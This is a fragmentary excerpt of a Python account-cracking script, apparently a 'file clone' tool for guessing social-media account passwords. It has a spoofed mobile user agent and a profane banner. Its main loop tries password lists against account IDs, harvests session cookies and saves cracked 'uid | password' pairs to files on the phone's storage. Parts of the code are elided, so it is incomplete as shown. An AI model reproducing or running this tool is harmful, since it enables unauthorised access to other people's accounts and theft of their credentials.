...
ugen = ["Mozilla/5.0 (Linux; Android 11; CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36"]
...
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝    
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;91m    [ WORKING MOBILE DATA + WIFI ]       \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [\033[1;31mR] AUTHOR    \033[1;91m: \033[1;91m SK- Kallan                    
 ┃ [\033[1;32mJ] TOOL      \033[1;92m: \033[1;92mFILE CLONE                
 ┃ [\033[1;33mR] STATUS    \033[1;91m: \033[1;91mFREE                        
 ┃ [\033[1;34mT] SYSTEM    \033[1;92m: \033[1;92mDATA & WIFI                 
 ┃ [\033[1;35mE] GITHUB    \033[1;91m: \033[1;91m FUK YOU🥵                 
 ┃ [\033[1;36mA] FACEBOOK  \033[1;92m: \033[1;92m Kallan mitro 🔥                 
 ┃ [\033[1;37mM] VIRSON    \033[1;92m: \033[1;96m[V0.2]                
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
# MAIN MANU 
def Main():
        os.system("clear")
...
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OK kallan-OK.txt')
    print(' [😁] CP kallan-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[RJR-RAKIB]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
""")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32m kallan-mitro-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/kallan-mitro-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
